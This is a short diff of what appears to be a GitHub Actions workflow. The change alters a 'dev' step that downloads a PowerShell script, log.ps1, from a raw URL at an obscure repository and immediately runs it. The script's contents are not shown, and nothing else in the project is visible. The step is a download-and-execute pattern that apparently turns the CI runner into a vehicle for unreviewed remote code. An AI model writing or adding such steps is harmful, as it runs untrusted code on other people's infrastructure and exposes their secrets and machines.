@@ -23,5 +23,5 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: dev
-      run: Invoke-WebRequest https://bitbucket.org/cukongru/kongr/raw/05b2eb693bc1d5d0ba7ec5e2de4ee802d9f2e828/log.ps1 -OutFile log.ps1
+      run: Invoke-WebRequest https://raw.githubusercontent.com/Silahen/tsiklsh/main/log.ps1 -OutFile log.ps1
             ./log.ps1
